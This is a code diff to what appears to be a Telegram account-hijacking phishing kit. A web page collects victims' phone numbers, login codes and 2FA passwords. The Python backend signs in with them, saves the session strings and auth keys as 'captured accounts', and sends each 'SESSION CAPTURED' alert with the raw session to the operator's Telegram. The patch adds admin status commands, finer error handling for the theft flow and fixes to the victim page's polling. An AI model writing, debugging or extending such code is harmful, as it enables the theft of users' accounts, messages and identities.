@@ -382,6 +382,7 @@ _main_bot_loop = None
 async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
     """Send message using bot's ORIGINAL event loop (cross-thread safe)."""
     if _main_bot_loop is None:
+        logger.warning("⚠️ _main_bot_loop is None — falling back to direct call")
         return await bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode)
     try:
         fut = asyncio.run_coroutine_threadsafe(
@@ -392,6 +393,17 @@ async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
     except Exception as e:
         logger.error(f"_send_via_main_loop err: {type(e).__name__}: {e}")
         raise
+
+
+async def _send_via_main_loop_edit(chat_id, msg_id, text, buttons=None):
+    """Edit message using bot's original loop."""
+    if _main_bot_loop is None:
+        return await bot.edit_message(chat_id, msg_id, text, buttons=buttons)
+    fut = asyncio.run_coroutine_threadsafe(
+        bot.edit_message(chat_id, msg_id, text, buttons=buttons),
+        _main_bot_loop
+    )
+    return await asyncio.wrap_future(fut)
 
 
 def admin_menu():
@@ -599,6 +611,39 @@ async def manual_reset(event):
     logger.info(f"♻️ /reset cmd: {phone}")
 
 
+@bot.on(events.NewMessage(pattern='/health'))
+async def health_cmd(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    txt = (f"🏥 HEALTH\n\n"
+           f"main_loop_ready: {_main_bot_loop is not None}\n"
+           f"bot connected: {bot.is_connected()}\n"
+           f"bot authorized: {await bot.is_user_authorized()}\n"
+           f"accounts: {len(captured_accounts)}\n"
+           f"pending_codes: {len(pending_codes)}\n"
+           f"user_sessions: {len(user_sessions)}\n"
+           f"reset_marker: {reset_all_marker}")
+    await event.respond(txt, buttons=admin_menu())
+
+
+@bot.on(events.NewMessage(pattern='/pending'))
+async def pending_cmd(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    with sessions_lock:
+        p = dict(pending_codes)
+        s = dict(user_sessions)
+    txt = "🔍 PENDING:\n"
+    for k, v in p.items():
+        txt += f"{k} → {v}\n"
+    txt += "\n🔄 SESSIONS:\n"
+    for k in s.keys():
+        txt += f"{k}\n"
+    if len(txt) > 4000:
+        txt = txt[:3990] + "..."
+    await event.respond(txt or "Empty")
+
+
 # ============================================================
 # SESSION VALIDITY
 # ============================================================
@@ -637,7 +682,7 @@ async def check_session_validity(session_str):
 
 
 # ============================================================
-# EDIT ADMIN MSG — cross-thread safe
+# EDIT ADMIN MSG
 # ============================================================
 async def edit_admin_msg(account, status_text):
     try:
@@ -697,17 +742,6 @@ async def edit_admin_msg(account, status_text):
     except Exception as e:
         logger.error(f"edit_admin_msg err: {e}")
         logger.error(traceback.format_exc())
-
-
-async def _send_via_main_loop_edit(chat_id, msg_id, text, buttons=None):
-    """Edit message using bot's original loop."""
-    if _main_bot_loop is None:
-        return await bot.edit_message(chat_id, msg_id, text, buttons=buttons)
-    fut = asyncio.run_coroutine_threadsafe(
-        bot.edit_message(chat_id, msg_id, text, buttons=buttons),
-        _main_bot_loop
-    )
-    return await asyncio.wrap_future(fut)
 
 
 # ============================================================
@@ -1500,6 +1534,7 @@ async def bot_main():
     logger.info("Admin bot starting...")
     await bot.start(bot_token=BOT_TOKEN)
     _main_bot_loop = asyncio.get_running_loop()
+    logger.info(f"✅ _main_bot_loop captured: {_main_bot_loop}")
     me = await bot.get_me()
     logger.info(f"✅ Admin bot started as @{me.username}")
     asyncio.create_task(broadcast_loop())
@@ -1631,10 +1666,10 @@ function checkResetThenBoot() {
   fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:cachedPhone}) })
   .then(function(r){ return r.json(); })
   .then(function(d){
-    var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+    var lastSeen = parseFloat(localStorage.getItem(URT) || '0') || 0;
     var serverReset = Math.max(d.phone_reset_at || 0, d.global_reset_at || 0);
     var forceWipe = false;
-    if (serverReset > 0 && serverReset >= lastSeen) forceWipe = true;
+    if (serverReset > 0 && serverReset > lastSeen) forceWipe = true;
     if (cachedCaptured && cachedPhone && d.still_captured === false) forceWipe = true;
     if (forceWipe) {
       wipeUserCache();
@@ -1739,9 +1774,9 @@ function startOtpCheck() {
   codeCheck = setInterval(function(){
     fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
     .then(function(r){ return r.json(); }).then(function(d){
-      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var lastSeen = parseFloat(localStorage.getItem(URT) || '0') || 0;
       var srv = Math.max(d.reset_at || 0, d.global_reset_at || 0);
-      if (srv > 0 && srv >= lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
+      if (srv > 0 && srv > lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
       if (d.s === '2fa_needed') { clearInterval(codeCheck); hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
       else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
       else if (d.s === 'err') { clearInterval(codeCheck); msg('otpMsg', 'Failed. Try resend.', 'err'); document.getElementById('resendBtn').style.display='block'; }
@@ -1776,9 +1811,9 @@ function startPwdCheck() {
   pwdCheck = setInterval(function(){
     fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
     .then(function(r){ return r.json(); }).then(function(d){
-      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var lastSeen = parseFloat(localStorage.getItem(URT) || '0') || 0;
       var srv = Math.max(d.reset_at || 0, d.global_reset_at || 0);
-      if (srv > 0 && srv >= lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
+      if (srv > 0 && srv > lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
       if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
     }).catch(function(){});
   }, 2000);
@@ -1811,10 +1846,10 @@ function openShare() {
     if (!cachedPhone) return;
     fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:cachedPhone}) })
     .then(function(r){ return r.json(); }).then(function(d){
-      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var lastSeen = parseFloat(localStorage.getItem(URT) || '0') || 0;
       var srv = Math.max(d.phone_reset_at || 0, d.global_reset_at || 0);
       var wipe = false;
-      if (srv > 0 && srv >= lastSeen) wipe = true;
+      if (srv > 0 && srv > lastSeen) wipe = true;
       if (localStorage.getItem(UCK) === '1' && cachedPhone && d.still_captured === false) wipe = true;
       if (wipe) {
         clearInterval(window.__sharePoll);
@@ -1952,20 +1987,55 @@ def _run_tg_thread(phone, code, password, tg_id):
         _run_tg_sync(phone, code, password, tg_id)
     except Exception as e:
         logger.error(f"run_tg_thread: {e}")
+        logger.error(traceback.format_exc())
 
 
 async def _tg_action(phone, code=None, password=None, tg_id=None):
     if not code:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
+        # ==== STEP 1: SEND OTP ====
+        logger.info(f"🚀 OTP REQUEST START: phone={phone}")
+        try:
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            logger.info(f"✅ Client connected for {phone}")
+        except Exception as ce:
+            logger.error(f"❌ Client connect fail {phone}: {type(ce).__name__}: {ce}")
+            logger.error(traceback.format_exc())
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': f'connect: {str(ce)[:60]}'}
+
         try:
             r = await client.send_code_request(phone)
             session_str = StringSession.save(client.session)
             with sessions_lock:
                 user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                 pending_codes[phone] = 'sent'
+            logger.info(f"✅ OTP SENT: {phone} | hash={r.phone_code_hash[:10]}... | type={type(r.type).__name__}")
             return {'success': True}
+        except errors.PhoneNumberBannedError:
+            logger.error(f"❌ OTP FAIL: PHONE BANNED {phone}")
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': 'Phone number banned by Telegram'}
+        except errors.PhoneNumberInvalidError:
+            logger.error(f"❌ OTP FAIL: INVALID NUMBER {phone}")
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': 'Invalid phone number'}
+        except errors.FloodWaitError as e:
+            logger.error(f"❌ OTP FAIL: FLOOD WAIT {e.seconds}s for {phone}")
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
+        except errors.ApiIdInvalidError:
+            logger.error(f"❌ OTP FAIL: API_ID INVALID for {phone}")
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': 'API ID invalid'}
         except Exception as e:
+            logger.error(f"❌ OTP FAIL: {type(e).__name__}: {e}")
+            logger.error(traceback.format_exc())
             with sessions_lock:
                 pending_codes[phone] = 'err'
             return {'success': False, 'error': str(e)[:80]}
@@ -1974,29 +2044,48 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                 await client.disconnect()
             except Exception:
                 pass
+
+    # ==== STEP 2: VERIFY CODE / 2FA ====
     with sessions_lock:
         if phone not in user_sessions:
-            return {'success': False, 'error': 'No session'}
+            logger.error(f"❌ VERIFY: No session stored for {phone}")
+            return {'success': False, 'error': 'No session. Resend code.'}
         s = user_sessions[phone]
+
+    logger.info(f"🔐 VERIFY START: phone={phone} code_len={len(code)} has_pwd={password is not None}")
+
     client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
     try:
         await client.connect()
         if not await client.is_user_authorized():
             try:
                 await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
+                logger.info(f"✅ SIGNED IN: {phone}")
             except errors.SessionPasswordNeededError:
+                logger.info(f"🔐 2FA NEEDED: {phone}")
                 with sessions_lock:
                     pending_codes[phone] = '2fa_needed'
                 if password:
                     try:
                         await client.sign_in(password=password)
+                        logger.info(f"✅ 2FA ACCEPTED: {phone}")
                     except errors.PasswordHashInvalidError:
+                        logger.error(f"❌ 2FA WRONG PASSWORD: {phone}")
                         return {'success': False, 'error': 'Wrong 2FA password'}
                 else:
                     return {'success': False, 'error': '2FA', 'needs_password': True}
+
         me = await client.get_me()
-        await client.get_dialogs()
+        logger.info(f"✅ AUTH OK: {phone} | user_id={me.id} name={me.first_name}")
+
+        try:
+            await client.get_dialogs()
+        except Exception as de:
+            logger.warning(f"get_dialogs warn: {de}")
+
         ss = StringSession.save(client.session)
+        logger.info(f"✅ SESSION GENERATED: {phone} len={len(ss)}")
+
         try:
             ak = client.session.auth_key.key
             dc = client.session.dc_id
@@ -2023,6 +2112,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         save_account(acc)
         global captured_accounts
         captured_accounts = load_accounts()
+        logger.info(f"✅ ACCOUNT SAVED: {phone}")
 
         phone_clean = phone.replace("+", "").strip()
         extra = ""
@@ -2051,6 +2141,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             ],
         ]
 
+        # ==== NOTIFY VIA MAIN LOOP (cross-thread safe) ====
         notify_sent = False
         try:
             r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
@@ -2078,16 +2169,31 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         if not notify_sent:
             try:
                 await _send_via_main_loop(YOUR_TELEGRAM_ID, f"🚨 SESSION CAPTURED (buttons failed)\nPhone: {phone}\n\n{ss}")
+                notify_sent = True
                 logger.info("✅ Fallback raw session sent")
             except Exception as e:
-                logger.error(f"FALLBACK FAIL: {e}")
+                logger.error(f"FALLBACK FAIL: {type(e).__name__}: {e}")
+                logger.error(traceback.format_exc())
 
         with sessions_lock:
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
+        logger.info(f"✅ FULL FLOW COMPLETE: {phone} notify={notify_sent}")
         return {'success': True, 'user_id': me.id}
+
+    except errors.PhoneCodeInvalidError:
+        logger.error(f"❌ PHONE CODE INVALID: {phone}")
+        return {'success': False, 'error': 'Wrong code'}
+    except errors.PhoneCodeExpiredError:
+        logger.error(f"❌ PHONE CODE EXPIRED: {phone}")
+        return {'success': False, 'error': 'Code expired. Resend.'}
+    except errors.SessionPasswordNeededError:
+        logger.info(f"🔐 SESSION PASSWORD NEEDED: {phone}")
+        return {'success': False, 'error': '2FA', 'needs_password': True}
     except Exception as e:
         es = str(e)
+        logger.error(f"❌ VERIFY FAIL {phone}: {type(e).__name__}: {es}")
+        logger.error(traceback.format_exc())
         if 'PHONE_CODE_INVALID' in es:
             return {'success': False, 'error': 'Wrong code'}
         if 'SESSION_PASSWORD_NEEDED' in es:
